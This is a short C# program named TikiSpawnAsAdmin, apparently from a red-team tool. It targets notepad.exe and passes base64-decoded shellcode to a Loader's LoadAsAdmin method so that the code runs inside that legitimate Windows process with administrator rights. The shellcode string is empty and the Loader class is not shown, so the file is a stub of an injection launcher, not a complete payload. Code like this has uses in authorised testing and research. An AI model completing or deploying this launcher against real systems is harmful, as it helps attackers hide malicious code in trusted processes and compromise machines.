using System;

namespace TikiSpawnAsAdmin
{
    class Program
    {
        static void Main()
        {
            string targetProcess = @"C:\\Windows\\System32\\notepad.exe";
            string encodedShellcode = @"";

            var ldr = new Loader();

            try
            {
                ldr.LoadAsAdmin(targetProcess, Convert.FromBase64String(encodedShellcode));
            }
            catch (Exception e)
            {
                Console.WriteLine("[x] Something went wrong!!" + e.Message);
            }
        }
    }
}
